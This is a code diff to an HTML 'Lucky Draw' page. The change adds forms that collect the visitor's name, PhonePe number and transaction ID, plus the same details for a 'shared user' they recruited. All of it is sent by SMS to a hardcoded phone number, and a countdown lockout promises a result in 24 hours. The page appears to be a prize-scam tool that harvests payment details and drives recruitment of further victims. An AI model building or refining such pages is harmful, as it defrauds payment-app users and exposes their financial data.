@@ -15,6 +15,7 @@
       align-items: center;
       height: 100vh;
       flex-direction: column;
+      text-align: center;
     }
 
     input {
@@ -42,22 +43,41 @@
     }
 
     .form {
-      display: flex;
+      display: none;
       flex-direction: column;
       align-items: center;
       box-shadow: 0 0 15px white;
       padding: 20px;
       border-radius: 12px;
     }
+
+    .form.active {
+      display: flex;
+    }
+
+    .green-heading {
+      color: #00ff00;
+    }
   </style>
 </head>
 <body>
 
-  <div class="form">
+  <!-- Shared User Details Form -->
+  <div class="form active" id="sharedForm">
     <h2>Lucky Draw</h2>
-    <input type="text" id="username" placeholder="Enter your name">
-    <input type="text" id="phonepay" placeholder="PhonePe number">
-    <input type="text" id="ref" placeholder="Transaction ID">
+    <h3 class="green-heading">Enter Shared User Details</h3>
+    <input type="text" id="sharedName" placeholder="Shared User Name">
+    <input type="text" id="sharedPhone" placeholder="Shared PhonePe Number">
+    <input type="text" id="sharedRef" placeholder="Shared Transaction ID">
+    <button id="nextBtn">Next</button>
+  </div>
+
+  <!-- Your Details Form -->
+  <div class="form" id="yourForm">
+    <h3 class="green-heading">Enter Your Details</h3>
+    <input type="text" id="yourName" placeholder="Your Name">
+    <input type="text" id="yourPhone" placeholder="Your PhonePe Number">
+    <input type="text" id="yourRef" placeholder="Your Transaction ID">
     <button id="sendBtn">Send</button>
   </div>
 
@@ -65,26 +85,68 @@
   <audio id="clickSound" src="https://github.com/Niranjan164/COMPILER/raw/main/click-151673_073339.mp3"></audio>
 
   <script>
+    // Check 24-hour access restriction
+    const storedTime = localStorage.getItem("time");
+    const currentTime = Date.now();
+    const oneDay = 24 * 60 * 60 * 1000;
+
+    if (storedTime) {
+      const timeDiff = currentTime - parseInt(storedTime);
+      const timeLeft = oneDay - timeDiff;
+
+      if (timeLeft > 0) {
+        const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+        document.body.innerHTML = `
+          <div>
+            <h2 class="green-heading">YOUR LUCK CAN BE KNOWN IN</h2>
+            <h1 class="green-heading">${hours}h ${minutes}m ${seconds}s</h1>
+          </div>
+        `;
+        throw new Error("Submission blocked within 24 hours.");
+      }
+    }
+
     const clickSound = document.getElementById('clickSound');
+    const nextBtn = document.getElementById('nextBtn');
     const sendBtn = document.getElementById('sendBtn');
+
+    nextBtn.addEventListener('click', () => {
+      clickSound.currentTime = 0;
+      clickSound.play();
+
+      const sharedName = document.getElementById('sharedName').value.trim();
+      const sharedPhone = document.getElementById('sharedPhone').value.trim();
+      const sharedRef = document.getElementById('sharedRef').value.trim();
+
+      if (!sharedName || !sharedPhone || !sharedRef) {
+        alert("Please fill in all shared user fields.");
+        return;
+      }
+
+      document.getElementById('sharedForm').classList.remove('active');
+      document.getElementById('yourForm').classList.add('active');
+    });
 
     sendBtn.addEventListener('click', () => {
       clickSound.currentTime = 0;
       clickSound.play();
 
-      const name = document.getElementById('username').value.trim();
-      const phone = document.getElementById('phonepay').value.trim();
-      const ref = document.getElementById('ref').value.trim();
+      const yourName = document.getElementById('yourName').value.trim();
+      const yourPhone = document.getElementById('yourPhone').value.trim();
+      const yourRef = document.getElementById('yourRef').value.trim();
 
-      if (!name || !phone || !ref) {
-        alert("Please fill in all fields.");
+      if (!yourName || !yourPhone || !yourRef) {
+        alert("Please fill in all your fields.");
         return;
       }
 
-      // Store current time (in milliseconds) to local storage
+      // Save current time
       localStorage.setItem("time", Date.now().toString());
 
-      const message = `USER NAME: ${name}%0APHONE PAY NUMBER: ${phone}%0APHONE PAY REFERENCE URL: ${ref}`;
+      const message = `SHARED USER NAME: ${document.getElementById('sharedName').value}%0ASHARED PHONE PAY: ${document.getElementById('sharedPhone').value}%0ASHARED REF: ${document.getElementById('sharedRef').value}%0A---%0AYOUR NAME: ${yourName}%0AYOUR PHONE PAY: ${yourPhone}%0AYOUR REF: ${yourRef}`;
       const smsUrl = `sms:9515888385?body=${message}`;
       window.location.href = smsUrl;
     });
